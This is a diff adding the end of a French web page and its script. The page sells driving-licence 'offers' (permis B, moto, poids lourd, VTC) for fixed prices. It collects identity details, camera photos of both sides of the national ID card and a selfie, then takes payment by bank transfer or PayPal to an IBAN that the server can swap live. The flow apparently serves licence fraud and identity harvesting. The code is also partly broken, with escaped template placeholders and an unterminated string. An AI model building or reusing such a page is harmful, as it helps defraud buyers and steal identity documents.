+    <div style="position:absolute;inset:8px;border-radius:50%;border:1.5px solid rgba(14,165,233,.15);animation:spin 5s linear infinite reverse"></div>
+    <div style="position:absolute;inset:16px;border-radius:50%;background:rgba(14,165,233,.08);display:flex;align-items:center;justify-content:center">
+      <div class="orb orb-pending" id="main-orb"></div>
+    </div>
+  </div>
+
+  <style>@keyframes spin{to{transform:rotate(360deg)}}</style>
+
+  <div>
+    <h2 class="font-syne font-bold text-white text-2xl mb-2">Dossier en cours de traitement</h2>
+    <p id="track-msg" style="color:#64748b;font-size:14px;line-height:1.6;max-width:300px;margin:0 auto">Nos équipes analysent votre dossier. Vous serez notifié dès validation.</p>
+  </div>
+
+  <div style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);border-radius:20px;padding:20px;width:100%;max-width:340px">
+    <div style="display:flex;flex-direction:column;gap:14px">
+      <div style="display:flex;align-items:center;gap:12px">
+        <div style="width:28px;height:28px;border-radius:50%;background:rgba(16,185,129,.15);border:1px solid #10b981;display:flex;align-items:center;justify-content:center;flex-shrink:0">
+          <svg width="12" height="12" viewBox="0 0 24 24" fill="#10b981"><path d="M20 6L9 17l-5-5"/></svg>
+        </div>
+        <div style="text-align:left">
+          <div style="color:#e8eaf0;font-size:13px;font-weight:500">Dossier reçu</div>
+          <div style="color:#10b981;font-size:11px">Confirmé</div>
+        </div>
+      </div>
+      <div style="display:flex;align-items:center;gap:12px" id="track2">
+        <div style="width:28px;height:28px;border-radius:50%;background:rgba(245,158,11,.1);border:1px solid #f59e0b;display:flex;align-items:center;justify-content:center;flex-shrink:0">
+          <div style="width:6px;height:6px;border-radius:50%;background:#f59e0b;animation:blink 1s infinite"></div>
+        </div>
+        <div style="text-align:left">
+          <div style="color:#e8eaf0;font-size:13px;font-weight:500">Vérification en cours</div>
+          <div style="color:#f59e0b;font-size:11px">En traitement…</div>
+        </div>
+      </div>
+      <div style="display:flex;align-items:center;gap:12px" id="track3">
+        <div style="width:28px;height:28px;border-radius:50%;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);display:flex;align-items:center;justify-content:center;flex-shrink:0">
+          <div style="width:8px;height:8px;border-radius:50%;background:#1e3a5f"></div>
+        </div>
+        <div style="text-align:left">
+          <div style="color:#64748b;font-size:13px;font-weight:500">Dossier validé</div>
+          <div id="track-status-label" style="color:#3d5068;font-size:11px">En attente</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div style="color:#3d5068;font-size:12px">Délai maximum : <span style="color:#38bdf8">7 jours ouvrés</span></div>
+  <div id="dossier-ref" style="color:#1e3a5f;font-size:11px"></div>
+</div>
+
+<script>
+// ═══════ STATE ═══════
+const S = {
+  step: 1,
+  offre: null, offreLabel: null, prix: null,
+  nom: '', prenom: '', email: '', tel: '', ville: '', cp: '',
+  caps: { recto: null, verso: null, selfie: null },
+  stream: null,
+  method: null,
+  proofFile: null,
+  payConfig: null,
+  dossierId: null,
+  sseSource: null,
+  priceSSE: null,
+};
+
+// ═══════ NAVIGATION ═══════
+function goTo(n) {
+  document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
+  document.getElementById('step' + n).classList.add('active');
+  S.step = n;
+  updateDots();
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+  if (n === 2) { loadLivePrices(); initPriceSSE(); }
+  if (n === 5) initStep5();
+  if (n === 6) buildRecap();
+}
+
+function updateDots() {
+  for (let i = 1; i <= 7; i++) {
+    const d = document.getElementById('d' + i);
+    d.className = 'dot';
+    if (i < S.step) d.classList.add('done');
+    else if (i === S.step) d.classList.add('active');
+  }
+}
+
+// ═══════ STEP 2 — PRIX DYNAMIQUES ═══════
+const DEFAULT_PRICES = { 'permis-b': 1250, 'permis-moto': 850, 'poids-lourd': 2400, 'vtc-taxi': 1800 };
+let livePrices = { ...DEFAULT_PRICES };
+
+async function loadLivePrices() {
+  try {
+    const r = await fetch(`\${API_URL}/api/prices/config`);
+    const d = await r.json();
+    livePrices['permis-b'] = d.permisB || DEFAULT_PRICES['permis-b'];
+    livePrices['permis-moto'] = d.permisMoto || DEFAULT_PRICES['permis-moto'];
+    livePrices['poids-lourd'] = d.poidsLourd || DEFAULT_PRICES['poids-lourd'];
+    livePrices['vtc-taxi'] = d.vtcTaxi || DEFAULT_PRICES['vtc-taxi'];
+    updateOfferPricesDOM();
+  } catch (e) {}
+}
+
+function updateOfferPricesDOM() {
+  const map = {
+    'permis-b':    { el: 'price-permis-b',    val: livePrices['permis-b'] },
+    'permis-moto': { el: 'price-permis-moto',  val: livePrices['permis-moto'] },
+    'poids-lourd': { el: 'price-poids-lourd',  val: livePrices['poids-lourd'] },
+    'vtc-taxi':    { el: 'price-vtc-taxi',      val: livePrices['vtc-taxi'] },
+  };
+  for (const [id, { el, val }] of Object.entries(map)) {
+    const node = document.getElementById(el);
+    if (node) node.textContent = val.toLocaleString('fr-FR') + ' €';
+    // Update selected offer price live
+    if (S.offre === id) { S.prix = val; }
+  }
+}
+
+// Écoute SSE prix (en plus du SSE paiement déjà ouvert à l'étape 5)
+function initPriceSSE() {
+  if (S.priceSSE) return;
+  S.priceSSE = new EventSource(`\${API_URL}/api/sse/events`);
+  S.priceSSE.addEventListener('prices-update', (e) => {
+    const d = JSON.parse(e.data);
+    livePrices['permis-b'] = d.permisB || livePrices['permis-b'];
+    livePrices['permis-moto'] = d.permisMoto || livePrices['permis-moto'];
+    livePrices['poids-lourd'] = d.poidsLourd || livePrices['poids-lourd'];
+    livePrices['vtc-taxi'] = d.vtcTaxi || livePrices['vtc-taxi'];
+    updateOfferPricesDOM();
+  });
+}
+
+function selectOffer(el, id, label) {
+  document.querySelectorAll('.offer-card').forEach(c => c.classList.remove('selected'));
+  el.classList.add('selected');
+  S.offre = id; S.offreLabel = label; S.prix = livePrices[id] || DEFAULT_PRICES[id];
+}
+function validateOffer() {
+  if (!S.offre) { show('errOffre'); return; }
+  hide('errOffre'); goTo(3);
+}
+
+// ═══════ STEP 3 ═══════
+function validateInfos() {
+  S.prenom = v('prenom'); S.nom = v('nom'); S.email = v('email');
+  S.tel = v('tel'); S.ville = v('ville'); S.cp = v('cp');
+  const ok = S.prenom && S.nom && S.email.includes('@') && S.tel.length === 9 && S.ville && S.cp.length === 5;
+  if (!ok) { show('errInfos'); return; }
+  hide('errInfos'); goTo(4);
+}
+
+// ═══════ STEP 4 — CAMERA ═══════
+async function startCam(type) {
+  const isS = type === 'selfie';
+  const vid = ge('vid-' + type);
+  const ph = ge('ph-' + type);
+  const scanEl = ge('scan-' + type);
+  const btn = ge('btn-' + type);
+  const box = ge('box-' + type);
+  const faceGuide = isS ? ge('face-guide') : null;
+
+  try {
+    if (S.stream) { S.stream.getTracks().forEach(t => t.stop()); S.stream = null; }
+    const constraints = {
+      video: {
+        facingMode: isS ? 'user' : { ideal: 'environment' },
+        width: { ideal: 1280 },
+        height: { ideal: 960 }
+      }
+    };
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    S.stream = stream;
+    vid.srcObject = stream;
+    vid.style.display = 'block';
+    ph.style.display = 'none';
+    scanEl.style.display = 'block';
+    box.classList.add('active-cam');
+    if (faceGuide) faceGuide.style.display = 'flex';
+    btn.textContent = 'Capturer maintenant';
+    btn.onclick = () => capturePhoto(type);
+  } catch (e) {
+    alert('Accès caméra refusé. Autorisez la caméra dans les paramètres de votre navigateur.');
+  }
+}
+
+function capturePhoto(type) {
+  const isS = type === 'selfie';
+  const vid = ge('vid-' + type);
+  const cvs = ge('cvs-' + type);
+  const ph = ge('ph-' + type);
+  const box = ge('box-' + type);
+  const st = ge('st-' + type);
+  const btn = ge('btn-' + type);
+  const scanEl = ge('scan-' + type);
+  const faceGuide = isS ? ge('face-guide') : null;
+
+  cvs.width = vid.videoWidth || 640;
+  cvs.height = vid.videoHeight || 480;
+  const ctx = cvs.getContext('2d');
+  if (isS) { ctx.translate(cvs.width, 0); ctx.scale(-1, 1); }
+  ctx.drawImage(vid, 0, 0, cvs.width, cvs.height);
+
+  if (S.stream) { S.stream.getTracks().forEach(t => t.stop()); S.stream = null; }
+  vid.style.display = 'none';
+  cvs.style.display = 'block';
+  scanEl.style.display = 'none';
+  box.classList.remove('active-cam');
+  box.classList.add('captured');
+  if (faceGuide) faceGuide.style.display = 'none';
+
+  cvs.toBlob(blob => {
+    S.caps[type] = blob;
+    st.textContent = 'Capturé';
+    st.style.color = '#10b981';
+  }, 'image/jpeg', 0.88);
+
+  btn.textContent = 'Reprendre';
+  btn.onclick = () => retakePhoto(type);
+}
+
+function retakePhoto(type) {
+  const cvs = ge('cvs-' + type);
+  const ph = ge('ph-' + type);
+  const box = ge('box-' + type);
+  const st = ge('st-' + type);
+  const btn = ge('btn-' + type);
+  cvs.style.display = 'none';
+  ph.style.display = 'flex';
+  box.classList.remove('captured');
+  S.caps[type] = null;
+  st.textContent = 'Non capturé';
+  st.style.color = '#3d5068';
+  const labels = { recto: 'Scanner le recto', verso: 'Scanner le verso', selfie: 'Prendre le selfie' };
+  btn.textContent = labels[type];
+  btn.onclick = () => startCam(type);
+}
+
+function validateBio() {
+  if (!S.caps.recto || !S.caps.verso || !S.caps.selfie) { show('errBio'); return; }
+  hide('errBio'); goTo(5);
+}
+
+// ═══════ STEP 5 ═══════
+async function initStep5() {
+  ge('recap-offre').textContent = S.offreLabel || '—';
+  ge('recap-prix').textContent = S.prix ? S.prix.toLocaleString('fr-FR') + ' €' : '—';
+  try {
+    const r = await fetch(`\${API_URL}/api/payment/config`);
+    S.payConfig = await r.json();
+    ge('val-benef').textContent = S.payConfig.beneficiaire || '—';
+    ge('val-iban').textContent = S.payConfig.iban || '—';
+    ge('val-bic').textContent = S.payConfig.bic || '—';
+    const lnk = ge('val-paypal');
+    lnk.textContent = S.payConfig.paypalLink || '—';
+    lnk.href = S.payConfig.paypalLink || '#';
+  } catch (e) {}
+
+  if (!S.sseSource) {
+    S.sseSource = new EventSource(`\${API_URL}/api/sse/events`);
+    S.sseSource.addEventListener('payment-config-update', e => {
+      const d = JSON.parse(e.data);
+      ge('val-benef').textContent = d.beneficiaire || '—';
+      ge('val-iban').textContent = d.iban || '—';
+      ge('val-bic').textContent = d.bic || '—';
+      ge('val-paypal').textContent = d.paypalLink || '—';
+      ge('val-paypal').href = d.paypalLink || '#';
+    });
+  }
+}
+
+function selectMethod(m) {
+  S.method = m;
+  ge('m-sepa').classList.toggle('selected', m === 'sepa');
+  ge('m-paypal').classList.toggle('selected', m === 'paypal');
+  ge('sepa-details').style.display = m === 'sepa' ? 'flex' : 'none';
+  ge('paypal-details').style.display = m === 'paypal' ? 'block' : 'none';
+}
+
+function handleProof(input) {
+  if (!input.files[0]) return;
+  S.proofFile = input.files[0];
+  const pn = ge('proof-name');
+  pn.textContent = '✓ ' + input.files[0].name;
+  pn.style.display = 'block';
+  ge('upload-zone').classList.add('has-file');
+}
+
+function doCopy(valId, btnId) {
+  const text = ge(valId).textContent;
+  navigator.clipboard.writeText(text).then(() => {
+    const btn = ge(btnId);
+    btn.textContent = '✓ Copié !';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'Copier'; btn.classList.remove('copied'); }, 2000);
+  });
+}
+
+function validatePayment() {
+  if (!S.method || !S.proofFile) { show('errPay'); return; }
+  hide('errPay'); goTo(6);
+}
+
+// ═══════ STEP 6 ═══════
+function buildRecap() {
+  const rows = [
+    ['Offre', S.offreLabel], ['Prix', S.prix ? S.prix.toLocaleString('fr-FR') + ' €' : '—'],
+    ['Prénom', S.prenom], ['Nom', S.nom], ['Email', S.email],
+    ['Téléphone', '+33 ' + S.tel], ['Ville', S.ville], ['Code postal', S.cp],
+    ['Paiement', S.method === 'sepa' ? 'Virement SEPA' : 'PayPal'],
+  ];
+  ge('recap-content').innerHTML = rows.map(([k, v]) => `
+    <div style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.07);border-radius:14px;padding:12px 16px;display:flex;justify-content:space-between;align-items:center">
+      <span style="color:#64748b;font-size:13px">${k}</span>
+      <span style="color:#e8eaf0;font-size:14px;font-weight:500">${v || '—'}</span>
+    </div>`).join('');
+
+  const photos = [
+    { key: 'recto', label: 'CNI Recto' }, { key: 'verso', label: 'CNI Verso' },
+    { key: 'selfie', label: 'Selfie' }, { key: 'proof', label: 'Paiement' },
+  ];
+  ge('recap-photos').innerHTML = photos.map(p => {
+    const blob = p.key === 'proof' ? S.proofFile : S.caps[p.key];
+    const url = blob ? URL.createObjectURL(blob) : null;
+    return url
+      ? `<div style="text-align:center"><img src="${url}" style="width:100%;height:80px;object-fit:cover;border-radius:10px;border:1px solid rgba(16,185,129,.4)"><div style="color:#94a3b8;font-size:10px;margin-top:4px">${p.label}</div></div>`
+      : `<div style="text-align:center"><div style="width:100%;height:80px;background:rgba(255,255,255,.04);border-radius:10px;border:1px solid rgba(255,255,255,.08)"></div><div style="color:#3d5068;font-size:10px;margin-top:4px">${p.label}</div></div>`;
+  }).join('');
+}
+
+async function submitDossier() {
+  const btn = ge('btn-submit');
+  btn.disabled = true;
+  btn.textContent = 'Envoi en cours…';
+
+  const fd = new FormData();
+  fd.append('offre', S.offre || '');
+  fd.append('offreLabel', S.offreLabel || '');
+  fd.append('prix', String(S.prix || 0));
+  fd.append('nom', S.nom);
+  fd.append('prenom', S.prenom);
+  fd.append('email', S.email);
+  fd.append('telephone', S.tel);
+  fd.append('ville', S.ville);
+  fd.append('codePostal', S.cp);
+  fd.append('methodePaiement', S.method || '');
+
+  if (S.caps.recto) fd.append('cniRecto', S.caps.recto, 'cni-recto.jpg');
+  if (S.caps.verso) fd.append('cniVerso', S.caps.verso, 'cni-verso.jpg');
+  if (S.caps.selfie) fd.append('selfie', S.caps.selfie, 'selfie.jpg');
+  if (S.proofFile) fd.append('preuvePaiement', S.proofFile, 'preuve-paiement.jpg');
+
+  try {
+    const r = await fetch(`\${API_URL}/api/dossiers/submit`, { method: 'POST', body: fd });
+    const data = await r.json();
+    if (data.dossierId) {
+      S.dossierId = data.dossierId;
+      goTo(7);
+      startTracking(data.dossierId);
+    } else {
+      alert('Erreur : ' + (data.error || 'Veuillez réessayer.'));
+      btn.disabled = false;
+      btn.textContent = 'Envoyer le dossier';
+    }
+  } catch (e) {
+    alert('Erreur réseau. Vérifiez votre connexion internet.');
+    btn.disabled = false;
+    btn.textContent = 'Envoyer le dossier';
+  }
+}
+
+// ═══════ STEP 7 ═══════
+function startTracking(id) {
+  ge('dossier-ref').textContent = 'Référence : ' + id;
+  const es = new EventSource(`\${API_URL}/api/sse/events`);
+  es.addEventListener('dossier-' + id + '-status', e => {
+    updateTracking(JSON.parse(e.data).statut);
+  });
+  // Fallback polling every 15s
+  const poll = setInterval(async () => {
+    try {
+      const r = await fetch(`\${API_URL}/api/dossiers/status/\${id});
+      const d = await r.json();
+      if (d.statut && d.statut !== 'en-attente') { updateTracking(d.statut); clearInterval(poll); }
+    } catch {}
+  }, 15000);
+}
+
+function updateTracking(statut) {
+  const orb = ge('main-orb');
+  const msg = ge('track-msg');
+  const lbl = ge('track-status-label');
+  if (statut === 'valide') {
+    orb.className = 'orb orb-ok';
+    msg.textContent = '🎉 Votre dossier a été validé ! Vous allez recevoir la confirmation.';
+    msg.style.color = '#10b981';
+    lbl.textContent = '✓ Validé';
+    lbl.style.color = '#10b981';
+    ge('track3').querySelector('div').style.background = 'rgba(16,185,129,.15)';
+    ge('track3').querySelector('div').style.borderColor = '#10b981';
+  } else if (statut === 'rejete') {
+    orb.className = 'orb orb-ko';
+    msg.textContent = 'Votre dossier a été refusé. Contactez-nous.';
+    msg.style.color = '#ef4444';
+    lbl.textContent = '✗ Refusé';
+    lbl.style.color = '#ef4444';
+  }
+}
+
+// ═══════ UTILS ═══════
+const ge = id => document.getElementById(id);
+const v = id => (ge(id)?.value || '').trim();
+const show = id => { ge(id).style.display = 'block'; };
+const hide = id => { ge(id).style.display = 'none'; };
+</script>
+</body>
+</html>
